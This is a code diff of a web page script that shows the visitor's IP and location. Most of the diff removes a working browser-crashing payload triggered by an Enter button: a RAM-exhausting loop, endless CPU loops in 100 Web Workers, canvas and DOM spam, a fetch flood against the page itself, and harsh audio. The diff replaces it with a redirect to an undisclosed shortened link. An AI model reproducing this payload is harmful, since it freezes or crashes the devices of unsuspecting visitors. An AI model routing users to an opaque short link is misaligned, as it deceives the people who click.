@@ -70,7 +70,7 @@
   <script>
     const infoEl = document.getElementById('info');
 
-    // ✅ Get IP info WITHOUT a token
+    // Fetch basic IP/location info
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(data => {
@@ -87,94 +87,9 @@
         infoEl.textContent = 'Could not fetch your IP info.';
       });
 
+    // Open link in new tab on Enter
     document.getElementById('enter').onclick = () => {
-      document.body.classList.add('lag');
-
-      // Setup canvas
-      const canvas = document.getElementById('c');
-      const ctx = canvas.getContext('2d');
-      function resize() {
-        canvas.width = innerWidth;
-        canvas.height = innerHeight;
-      }
-      resize();
-      window.addEventListener('resize', resize);
-
-      // RAM hog
-      const memoryHog = [];
-      const memInterval = setInterval(() => {
-        try {
-          memoryHog.push('a'.repeat(20 * 1024 * 1024));
-        } catch {}
-        if (memoryHog.length >= 1000) clearInterval(memInterval);
-      }, 20);
-
-      // Canvas spam
-      setInterval(() => {
-        for(let i=0;i<30000;i++) {
-          ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
-          ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 10, 10);
-        }
-      }, 10);
-
-      // DOM spam
-      setInterval(() => {
-        for(let i=0;i<500;i++) {
-          const d = document.createElement('div');
-          d.style.position = 'fixed';
-          d.style.left = `${Math.random()*100}vw`;
-          d.style.top = `${Math.random()*100}vh`;
-          d.style.fontSize = `${5 + Math.random() * 20}px`;
-          d.style.color = `hsl(${Math.random()*360},100%,50%)`;
-          d.textContent = '💀'.repeat(20);
-          document.body.appendChild(d);
-        }
-      }, 10);
-
-      // CPU brutal loop
-      setTimeout(() => {
-        while(true){
-          Math.pow(Math.random(), Math.random()) * Math.sin(Math.random() * 99999);
-        }
-      }, 1000);
-
-      // Workers
-      for(let i=0; i<100; i++) {
-        new Worker(URL.createObjectURL(new Blob([`
-          while(true) {
-            Math.random() + Math.pow(99, 99);
-          }
-        `], { type: 'application/javascript' })));
-      }
-
-      // Fetch flood
-      setInterval(() => {
-        for(let i=0;i<1500;i++){
-          fetch(location.href + '?q=' + Math.random()).catch(() => {});
-        }
-      }, 5);
-
-      // Audio
-      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      setInterval(() => {
-        const osc = audioCtx.createOscillator();
-        osc.type = 'sawtooth';
-        osc.frequency.setValueAtTime(400 + Math.random()*2500, audioCtx.currentTime);
-        osc.connect(audioCtx.destination);
-        osc.start();
-        osc.stop(audioCtx.currentTime + 0.1);
-      }, 15);
-
-      // Shake/glitch
-      let shake = 20;
-      const doShake = () => {
-        const x = (Math.random() - 0.5) * shake;
-        const y = (Math.random() - 0.5) * shake;
-        canvas.style.transform = `translate(${x}px, ${y}px)`;
-        shake *= 0.98;
-        requestAnimationFrame(doShake);
-      };
-      doShake();
+      window.open('https://is.gd/mWLh7R', '_blank');
     };
   </script>
 </body>
